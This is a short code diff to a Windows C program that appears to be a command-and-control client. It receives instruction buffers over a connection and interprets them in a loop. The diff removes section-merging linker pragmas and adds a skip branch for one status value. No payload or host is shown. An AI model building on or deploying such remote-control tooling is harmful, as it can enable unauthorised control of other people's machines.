@@ -1,8 +1,3 @@
-#pragma comment(linker, "/FILEALIGN:16")
-#pragma comment(linker, "/ALIGN:16")// Merge sections
-#pragma comment(linker, "/MERGE:.rdata=.data")
-#pragma comment(linker, "/MERGE:.text=.data")
-#pragma comment(linker, "/MERGE:.reloc=.data")
 #include <stdio.h>
 #include <windows.h>
 #include <stdlib.h>
@@ -29,6 +24,8 @@ int main(){
                 cleanC2(*conn);
                 free(conn);
                 break;
+            }else if(state.isize == -2){
+                continue;
             }
             int size = state.isize;
             unsigned char* instructs = state.instructs;
@@ -45,6 +42,7 @@ int main(){
 
             while((ip-size) < instructs){ //is there still stuff on stack
                 unsigned int mnem = popint(&ip);
+                
                 if(mnem == EXIT){
                     free(data-BACKLOG);
                     free(instructs);
